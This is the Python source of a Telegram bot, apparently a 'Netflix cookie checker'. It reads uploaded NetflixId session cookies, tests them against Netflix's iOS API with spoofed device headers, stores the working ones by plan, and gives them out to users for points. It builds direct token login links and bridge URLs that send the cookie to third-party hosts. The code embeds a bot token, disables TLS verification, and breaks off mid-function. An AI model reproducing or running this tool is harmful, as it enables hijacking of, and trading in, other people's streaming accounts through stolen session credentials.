import telebot
import pyzipper
import os
import re
import sqlite3
import shutil
import urllib.parse
import time
import requests
import threading
import random
import json
from datetime import datetime, date
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت والتوكن ---
TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
bot = telebot.TeleBot(TOKEN)

# 👑 إعدادات المطور وقناتك الرسمية الثابتة
DEVELOPER_CHAT_ID = 8713916851
DEVELOPER_USERNAME = "farxxes"
CHANNEL_LINK = "https://t.me/farxxess"

# إعدادات السيرفرات العشوائية الشغالة
api_hosts = [
    "https://nftokengen-7ik6.onrender.com",
    "https://netflixtokengenapi.onrender.com"
]

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

active_scans = {}

# ====================================================
# ✅ إعدادات قاعدة البيانات وضمان المخزن
# ====================================================
DB_DIR = "database"
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)

DB_FILE = os.path.join(DB_DIR, "bot_database.db")
db_lock = threading.Lock()

def db_execute(query, params=(), fetch=False, fetchall=False):
    with db_lock:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute(query, params)
        if fetch:
            res = cursor.fetchone()
        elif fetchall:
            res = cursor.fetchall()
        else:
            res = None
        conn.commit()
        conn.close()
        return res

def load_all_data():
    db_execute('''CREATE TABLE IF NOT EXISTS users (
                    chat_id INTEGER PRIMARY KEY, 
                    points INTEGER, 
                    username TEXT, 
                    role TEXT, 
                    lang TEXT DEFAULT 'ar',
                    created_at TEXT DEFAULT CURRENT_DATE)''')
                    
    db_execute('''CREATE TABLE IF NOT EXISTS cookies (cookie TEXT PRIMARY KEY, plan TEXT DEFAULT 'PREMIUM')''')
    db_execute('''CREATE TABLE IF NOT EXISTS history (cookie TEXT PRIMARY KEY)''')
    db_execute('''CREATE TABLE IF NOT EXISTS banned (chat_id INTEGER PRIMARY KEY)''')
    db_execute('''CREATE TABLE IF NOT EXISTS temp_files (id INTEGER PRIMARY KEY AUTOINCREMENT, file_path TEXT, original_name TEXT)''')
    db_execute('''CREATE TABLE IF NOT EXISTS stock_alerts (chat_id INTEGER PRIMARY KEY, plan TEXT)''')
    
    db_execute('''CREATE TABLE IF NOT EXISTS dispense_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id INTEGER,
                    username TEXT,
                    plan TEXT,
                    dispense_date TEXT DEFAULT CURRENT_DATE,
                    status TEXT DEFAULT 'SUCCESS')''')
                    
    print("✅ تم تجهيز واستقرار المخزن وقاعدة البيانات بنجاح!")

load_all_data()

# ====================================================
# 🌐 قاموس اللغات المنقح والتفاعلي
# ====================================================
LANG_DICT = {
    "ar": {
        "welcome_new": "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!",
        "welcome_back": "مرحباً بك مجدداً في لوحة التحكم الخاصة بك 👇",
        "btn_check": "🔍 فحص (ملف/نص/رابط)",
        "btn_dispense": "🎁 سحب حساب نتفلكس",
        "btn_pool": "📊 فحص المخزن والنقاط",
        "btn_faq": "💡 المساعدة والأسئلة الشائعة",
        "btn_lang": "🌐 Change Language / تغيير اللغة",
        "btn_admin": "👑 لوحة تحكم المطور السريّة",
        "no_points": "📬 نفدت نقاطك أو رصيدك غير كافٍ للسحب! يمكنك إرسال طلب شحن تلقائي للمطور فارس مباشرة بالضغط على الزر أدناه 👇",
        "btn_req_charge": "📥 طلب شحن نقاط",
        "req_success": "✅ تم إرسال طلب الشحن التلقائي إلى المطور فارس بنجاح! سيتم مراجعة طلبك وشحن حسابك فوراً 👍",
        "dev_mode": "♾️ وضع المطور",
        "vip_mode": "💎 رتبة VIP",
        "select_plan": "👇 يرجى اختيار فئة الحساب التي تريد سحبها:",
        "plan_cost": "تكلفة",
        "points_unit": "نقاط",
        "point_unit": "نقطة",
        "available": "المتوفر",
        "btn_alert": "🔔 نبهني عند التعبئة",
        "alert_saved": "✅ تم تفعيل التنبيه! سأرسل لك رسالة خاصة فور قيام فارس بتعبئة هذه الفئة.",
        "alert_notify": "🔥 أبشر! تم شحن فئة {plan} الآن في المخزن، اسحب قبل نفاذ الكمية! 🍿",
        "empty_stock": "❌ فئة {plan} فارغة حالياً! يمكنك تفعيل التنبيه بالأسفل ليتم إخطارك فور التعبئة.",
        "pool_status": "📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n\n🔹 **المخزن المتوفر حالياً:**\n• البريميوم (Premium): {p_count} حساب\n• القياسي (Standard): {s_count} حساب\n• الأساسي (Basic): {b_count} حساب",
        "faq_title": "💡 **قسم المساعدة والدعم الفني:**\n\nلمشاهدة شروحات تشغيل الكوكيز بالتفصيل على الهاتف أو الكمبيوتر بالفيديو، يرجى الانتقال إلى قناتنا الرسمية بالضغط على الزر أدناه 👇:",
    },
    "en": {
        "welcome_new": "Welcome to Fares's Smart Netflix Bot 😉🔥\n\n🎁 As a welcome gift, **you have been granted 5 free points** to try it out immediately!",
        "welcome_back": "Welcome back to your control panel 👇",
        "btn_check": "🔍 Check (File/Text/Link)",
        "btn_dispense": "🎁 Dispense Netflix Account",
        "btn_pool": "📊 Check Stock & Points",
        "btn_faq": "💡 Help & FAQ",
        "btn_lang": "🌐 تغيير اللغة / Change Language",
        "btn_admin": "👑 Secret Developer Panel",
        "no_points": "📬 Out of points or insufficient balance! You can send an automatic recharge request directly to Fares using the button below 👇",
        "btn_req_charge": "📥 Request Points Recharge",
        "req_success": "✅ Your automatic recharge request has been sent to Fares successfully! Your balance will be updated shortly 👍",
        "dev_mode": "♾️ Developer Mode",
        "vip_mode": "💎 VIP Rank",
        "select_plan": "👇 Please choose the account category you want to dispense:",
        "plan_cost": "Cost",
        "points_unit": "points",
        "point_unit": "point",
        "available": "Available",
        "btn_alert": "🔔 Notify me when stocked",
        "alert_saved": "✅ Notification activated! I will send you a private message as soon as Fares restocks this category.",
        "alert_notify": "🔥 Good news! The {plan} category has just been restocked, dispense yours before it runs out! 🍿",
        "empty_stock": "❌ {plan} category is currently empty! You can activate the notification below to be notified as soon as it is restocked.",
        "pool_status": "📦 **Account & Stock Status:**\n\n👤 Your current balance: **{points}**\n\n🔹 **Current Available Stock:**\n• Premium: {p_count} accounts\n• Standard: {s_count} accounts\n• Basic: {b_count} accounts",
        "faq_title": "💡 **Help & Technical Support Section:**\n\nTo watch detailed video tutorials on how to use cookies on Phone or PC, please visit our official channel using the button below 👇:",
    }
}

def get_user_lang(chat_id):
    res = db_execute("SELECT lang FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    return res[0] if res else "ar"

# ====================================================
# 🔍 محرك الفحص والاتصال الذكي
# ====================================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "modelType": "IPHONE8-1",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def check_ban(func):
    def wrapper(message, *args, **kwargs):
        try:
            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
        except Exception:
            chat_id = message.message.chat.id
        
        if db_execute("SELECT 1 FROM banned WHERE chat_id=?", (chat_id,), fetch=True):
            bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            
            membership_status = value_data.get("membershipStatus", "UNKNOWN")
            is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
            
            if membership_status == "FORMER_MEMBER" or is_on_hold:
                return None

            video_quality = str(value_data.get("videoQuality", "")).upper()
            raw_response_text = json.dumps(data).upper() if 'json' in response.headers.get('Content-Type', '') else response.text.upper()
            
            if "RESTART" in raw_response_text or "COMPLETE" in raw_response_text or "SIGNUP" in raw_response_text:
                return None

            plan_type = "PREMIUM" 
            if "BASIC" in video_quality or "SD" in video_quality or "BASIC" in raw_response_text:
                plan_type = "BASIC"
            elif "STANDARD" in video_quality or "HD" in video_quality or "STANDARD" in raw_response_text:
                plan_type = "STANDARD"
            elif "PREMIUM" in video_quality or "UHD" in video_quality or "4K" in raw_response_text:
                plan_type = "PREMIUM"

            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
                
            if token:
                geoblock_status = value_data.get("geoBlockStatus", {})
                if not geoblock_status.get("isBlocked", False):
                    return {"token": token, "expires": expires, "bypass": False, "plan": plan_type}
        
        fallback_url = "https://www.netflix.com/YourAccount"
        res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
        
        if res_fallback.status_code == 302:
            loc = res_fallback.headers.get("Location", "").lower()
            if "signup" in loc or "login" in loc or "restart" in loc:
                return None
                
        if res_fallback.status_code == 200 and "signup" not in res_fallback.text.lower():
            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "PREMIUM"}
        return None
    except Exception:
        return None

def trigger_stock_alert_notifications(plan_name):
    alerts = db_execute("SELECT chat_id FROM stock_alerts WHERE plan=?", (plan_name,), fetchall=True)
    if alerts:
        for (user_id,) in alerts:
            lang = get_user_lang(user_id)
            msg = LANG_DICT[lang]["alert_notify"].format(plan=plan_name)
            try:
                bot.send_message(user_id, msg)
            except Exception:
                pass
        db_execute("DELETE FROM stock_alerts WHERE plan=?", (plan_name,))

def auto_clean_pool_job():
    while True:
        time.sleep(43200)
        all_cookies = db_execute("SELECT cookie FROM cookies", fetchall=True)
        if all_cookies:
            for (cookie_val,) in all_cookies:
                if not check_netflix_cookie_detailed(cookie_val):
                    db_execute("DELETE FROM cookies WHERE cookie=?", (cookie_val,))

threading.Thread(target=auto_clean_pool_job, daemon=True).start()

def safe_send_message(chat_id, text, markup=None):
    while True:
        try:
            return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True, parse_mode="Markdown")
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(re.search(r'retry after (\d+)', e.description).group(1)) if re.search(r'retry after (\d+)', e.description) else 5
                time.sleep(retry_after + 1)
            else:
                break
    return None

def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
    total_count = len(netflix_ids)
    active_scans[chat_id] = True
    clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
    live_accounts_accumulator = []
    stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
    status = bot.send_message(chat_id, f"⏳ جاري فحص وتخزين الكوكيز في المخزن...\n\n(تم العثور على {total_count} كوكيز وجاري الفرز...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
    live_count, dead_count, dup_count = 0, 0, 0
    newly_added_plans = set()
    
    for index, netflix_id in enumerate(netflix_ids, start=1):
        if not active_scans.get(chat_id, False):
            safe_send_message(chat_id, f"🛑 تم إلغاء الفحص!\n✅ شغال ومخزن: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}")
            return
        
        is_duplicate = db_execute("SELECT 1 FROM history WHERE cookie=?", (netflix_id,), fetch=True) is not None
        
        if index % 5 == 0 or index == total_count:
            try:
                bot.edit_message_text(f"⏳ جاري الفحص والحفظ بالمخزن: ({index}/{total_count})\n✅ شغال ومخزن: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
            except Exception:
                pass
                
        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            plan_detected = result["plan"]
            if is_duplicate:
                dup_count += 1
            else:
                live_count += 1
                newly_added_plans.add(plan_detected)
                db_execute("INSERT OR IGNORE INTO history (cookie) VALUES (?)", (netflix_id,))
                db_execute("INSERT OR REPLACE INTO cookies (cookie, plan) VALUES (?, ?)", (netflix_id, plan_detected))
                
            token = result["token"]
            expires = result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={netflix_id}"
            direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            chosen_host = random.choice(api_hosts)
            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
            dup_tag = " (مكرر شغال)" if is_duplicate else ""
            res_text = f"🌟 **{plan_detected} ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• الفئة المصنفة: *{plan_detected}*\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
            txt_entry = f"Cookie: {full_cookie_string}\nPlan: {plan_detected}\nURL: {direct_netflix_url}\n====================\n\n"
            live_accounts_accumulator.append(txt_entry)
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            safe_send_message(chat_id, res_text, markup)
            time.sleep(1.2)
        else:
            if is_duplicate:
                db_execute("DELETE FROM history WHERE cookie=?", (netflix_id,))
                db_execute("DELETE FROM cookies WHERE cookie=?", (netflix_id,))
            dead_count += 1
        time.sleep(0.1)
        
    active_scans.pop(chat_id, None)
    current_points = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)[0]
    safe_send_message(chat_id, f"📊 **اكتمل الفحص وتم حفظ الحسابات الشغالة بالمخزن بنجاح!**\n\n✅ المضاف للمخزن: {live_count}\n❌ التالف المستبعد: {dead_count}\n✂️ المكرر الشغال: {dup_count}\n\n🪙 رصيدك الحالي: {current_points} نقطة 🪙")
    if live_accounts_accumulator:
        send_txt_file(chat_id, live_accounts_accumulator, source_name)
        
    for plan in newly_added_plans:
        threading.Thread(target=trigger_stock_alert_notifications, args=(plan,), daemon=True).start()

def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
    if not netflix_ids:
        safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
        return
    threading.Thread(target=_threaded_cookies_check, args=(chat_id, netflix_ids, reply_to_message_id, source_name), daemon=True).start()

def send_txt_file(chat_id, accounts_list, original_filename):
    try:
        clean_name = os.path.splitext(original_filename)[0]
        output_txt_path = os.path.join(BASE_TEMP_DIR, f"{clean_name}_LIVE.txt")
        with open(output_txt_path, 'w', encoding='utf-8') as f:
            for item in accounts_list:
                f.write(item)
        with open(output_txt_path, 'rb') as doc:
            bot.send_document(chat_id, doc, caption="📁 ملف الحسابات الشغالة المجمعة والمنظمة حسب الفئة 🔥")
        if os.path.exists(output_txt_path):
            os.remove(output_txt_path)
    except Exception as e:
        print(e)

def generate_main_keyboard(user_id, lang=None):
    if not lang:
        lang = get_user_lang(user_id)
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_check"], callback_data="menu_check"))
    
    if user_id == DEVELOPER_CHAT_ID:
        dispense_text = "🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)" if lang == "ar" else "🎁 Dispense Netflix (Dev Mode ♾️)"
        markup.add(InlineKeyboardButton(dispense_text, callback_data="menu_dispense_plans"))
    else:
        markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_dispense"], callback_data="menu_dispense_plans"))
    
    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_pool"], callback_data="check_pool_status"))
    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_faq"], callback_data="open_faq_section"))
    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_lang"], callback_data="toggle_language"))
    
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_admin"], callback_data="open_admin_panel"))
        
    return markup

# ====================================================
# 🚀 دالة الـ /start وضبط الترحيب
# ====================================================
@bot.message_handler(commands=['start'])
@check_ban
def send_welcome(message):
    chat_id = message.chat.id
    
    user_exists = db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    
    if not user_exists:
        db_execute("INSERT INTO users (chat_id, points, username, role, lang, created_at) VALUES (?, ?, ?, ?, ?, CURRENT_DATE)", 
                   (chat_id, 5, message.from_user.username or "", "MEMBER", "ar"))
        keyboard = generate_main_keyboard(chat_id, lang="ar")
        bot.send_message(chat_id, LANG_DICT["ar"]["welcome_new"], reply_markup=keyboard, parse_mode="Markdown")
    else:
        lang = get_user_lang(chat_id)
        keyboard = generate_main_keyboard(chat_id, lang=lang)
        bot.send_message(chat_id, LANG_DICT[lang]["welcome_back"], reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "menu_dispense_plans")
@check_ban
def show_plans_menu(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    
    p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
    s_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='STANDARD'", fetch=True)[0]
    b_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='BASIC'", fetch=True)[0]
    
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    
    p_text = f"💎 Premium ({LANG_DICT[lang]['plan_cost']}: 3 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {p_count}]"
    s_text = f"✨ Standard ({LANG_DICT[lang]['plan_cost']}: 2 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {s_count}]"
    b_text = f"⚙️ Basic ({LANG_DICT[lang]['plan_cost']}: 1 {LANG_DICT[lang]['point_unit']}) [{LANG_DICT[lang]['available']}: {b_count}]"
    
    markup.add(
        InlineKeyboardButton(p_text, callback_data="pull_account_PREMIUM_3"),
        InlineKeyboardButton(s_text, callback_data="pull_account_STANDARD_2"),
        InlineKeyboardButton(b_text, callback_data="pull_account_BASIC_1")
    )
    
    try:
        bot.edit_message_text(LANG_DICT[lang]["select_plan"], chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("pull_account_"))
@check_ban
def handle_pull_account_category(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    data_parts = call.data.split("_")
    plan_target = data_parts[2]
    cost = int(data_parts[3])
    
    user_data = db_execute("SELECT points, role, username FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    points, role, username = user_data[0], user_data[1], user_data[2]
    
    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and points < cost:
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton(LANG_DICT[lang]["btn_req_charge"], callback_data="trigger_auto_recharge_request"))
        bot.send_message(chat_id, LANG_DICT[lang]["no_points"], reply_markup=markup)
        return
        
    count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan=?", (plan_target,), fetch=True)[0]
    if count == 0:
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton(LANG_DICT[lang]["btn_alert"], callback_data=f"activate_alert_{plan_target}"))
        try:
            bot.edit_message_text(LANG_DICT[lang]["empty_stock"].format(plan=plan_target), chat_id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass
        return
        
    while True:
        cookie_row = db_execute("SELECT cookie FROM cookies WHERE plan=? LIMIT 1", (plan_target,), fetch=True)
        if not cookie_row:
            break
        current_cookie = cookie_row[0]
        db_execute("DELETE FROM cookies WHERE cookie=?", (current_cookie,))
        
        fresh_result = check_netflix_cookie_detailed(current_cookie)
        if fresh_result:
            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
                db_execute("UPDATE users SET points = points - ? WHERE chat_id=?", (cost, chat_id))
                points -= cost
            
            uname_val = username if username else f"User_{chat_id}"
            db_execute("INSERT INTO dispense_logs (chat_id, username, plan, dispense_date, status) VALUES (?, ?, ?, CURRENT_DATE, 'SUCCESS')", (chat_id, uname_val, plan_target))

            token = fresh_result["token"]
            expires = fresh_result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={current_cookie}"
            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            chosen_host = random.choice(api_hosts)
            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
            short_id = current_cookie[:15]
            
            points_display = LANG_DICT[lang]["dev_mode"] if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points} {LANG_DICT[lang]['points_unit']}")
            
            if lang == "ar":
                success_text = f"🎉 **تفضّل رابط نتفلكس الطازج الخاص بك ({plan_target})** 🎉\n\n🪙 رصيدك المتبقي الحالي: {points_display}.\n📅 **تاريخ الفواتير القادم:** {date_str}\n\n🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}"
            else:
                success_text = f"🎉 **Here is your fresh Netflix link ({plan_target})** 🎉\n\n🪙 Your remaining balance: {points_display}.\n📅 **Next billing date:** {date_str}\n\n🔗 **Direct Login Link:**\n{direct_netflix_url}"
                
            user_markup = InlineKeyboardMarkup()
            user_markup.row_width = 2
            user_markup.add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            user_markup.add(
                InlineKeyboardButton("✅ Yes, Works", callback_data=f"fb_yes_{plan_target}_{short_id}"), 
                InlineKeyboardButton("❌ No, Dead", callback_data=f"fb_no_{plan_target}_{short_id}")
            )
            
            bot.send_message(chat_id, success_text, reply_markup=user_markup, parse_mode="Markdown")
            return

# ====================================================
# 🔥 معالجة طلب الشحن التلقائي التفاعلي المباشر
# ====================================================
@bot.callback_query_handler(func=lambda call: call.data == "trigger_auto_recharge_request")
@check_ban
def handle_auto_recharge_button(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    user_info = call.from_user
    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
    
    dev_alert_text = (
        f"📥 **طلب شحن نقاط تلقائي جديد**\n\n"
        f"👤 **المستخدم:** {user_info.first_name}\n"
        f"🏷️ **اليوزر نيم:** {username}\n"
        f"🆔 **الآيدي الخاص به:** `{chat_id}`\n"
        f"💬 **الرسالة:** أريد شحن نقاط في البوت."
    )
    
    admin_markup = InlineKeyboardMarkup()
    admin_markup.add(InlineKeyboardButton("➕ إضافة نقاط مباشرة", callback_data=f"fast_charge_{chat_id}"))
    
    try:
        bot.send_message(DEVELOPER_CHAT_ID, dev_alert_text, reply_markup=admin_markup, parse_mode="Markdown")
    except Exception:
        pass
        
    try:
        bot.edit_message_text(LANG_DICT[lang]["req_success"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id, lang=lang))
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("fast_charge_"))
def admin_fast_charge_trigger(call):
    if call.message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    target_user_id = call.data.split("_")[2]
    
    msg = bot.send_message(DEVELOPER_CHAT_ID, f"🔢 أرسل الآن عدد النقاط التي تريد إضافتها مباشرة للآيدي `{target_user_id}`:")
    bot.register_next_step_handler(msg, process_fast_charge_value, target_user_id)

def process_fast_charge_value(message, target_id):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        amount = int(message.text)
        db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (amount, target_id))
        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (target_id,), fetch=True)[0]
        
        bot.reply_to(message, f"✅ **تم الشحن السريع بنجاح!**\n\n👤 الآيدي: `{target_id}`\n➕ المضاف: **+{amount}** نقطة\n🪙 الرصيد الإجمالي الحالي: **{new_points}** نقطة", parse_mode="Markdown")
        try:
            bot.send_message(target_id, f"🎉 **إشعار شحن رصيد!**\n\nقام المطور **فارس** بشحن حسابك تلقائياً.\n➕ الكمية المضافة: **+{amount}** نقطة.\n💰 رصيدك الإجمالي الحالي: **{new_points} نقطة** 🔥.", parse_mode="Markdown")
        except Exception:
            pass
    except ValueError:
        bot.send_message(DEVELOPER_CHAT_ID, "⚠️ خطأ: يرجى إدخال قيمة رقمية صحيحة فقط (مثال: 10).")

# ====================================================

@bot.callback_query_handler(func=lambda call: call.data == "open_faq_section")
@check_ban
def faq_menu_handler(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎥 مشاهدة شروحات التشغيل في القناة", url=CHANNEL_LINK))
    markup.add(InlineKeyboardButton("⬅️ Back / عودة", callback_data="faq_back_to_main"))
    try:
        bot.edit_message_text(LANG_DICT[lang]["faq_title"], chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "faq_back_to_main")
def faq_back_button(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    try:
        bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id, lang=lang))
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
@check_ban
def handle_toggle_language(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    current_lang = get_user_lang(chat_id)
    new_lang = "en" if current_lang == "ar" else "ar"
    db_execute("UPDATE users SET lang=? WHERE chat_id=?", (new_lang, chat_id))
    
    try:
        bot.edit_message_text(LANG_DICT[new_lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id, lang=new_lang))
    except Exception:
        pass

@bot.message_handler(commands=['id'])
@check_ban
def send_user_id(message):
    chat_id = message.chat.id
    user_first_name = message.from_user.first_name
    id_text = f"👤 **معلومات الحساب الخاص بك:**\n\n• الاسم: **{user_first_name}**\n• الآيدي الخاص بك (ID): `{chat_id}`\n\n💡 _اضغط على الآيدي لنسخه تلقائياً وإرساله للمطور فارس لشحن نقاطك!_"
    bot.reply_to(message, id_text, parse_mode="Markdown")

@bot.message_handler(commands=['add'])
def add_points_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    try:
        command_parts = message.text.split()
        if message.reply_to_message:
            if len(command_parts) < 2:
                bot.reply_to(message, "⚠️ خطأ: يرجى كتابة عدد النقاط، مثال: `/add 10` بالرد على رسالته.", parse_mode="Markdown")
                return
            amount = int(command_parts[1])
            target_id = message.reply_to_message.from_user.id
        else:
            if len(command_parts) < 3:
                bot.reply_to(message, "⚠️ خطأ: يرجى تحديد النقاط والآيدي، مثال: `/add 10 12345678`", parse_mode="Markdown")
                return
            amount = int(command_parts[1])
            target_id = int(command_parts[2])
            
        db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (amount, target_id))
        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (target_id,), fetch=True)[0]
        
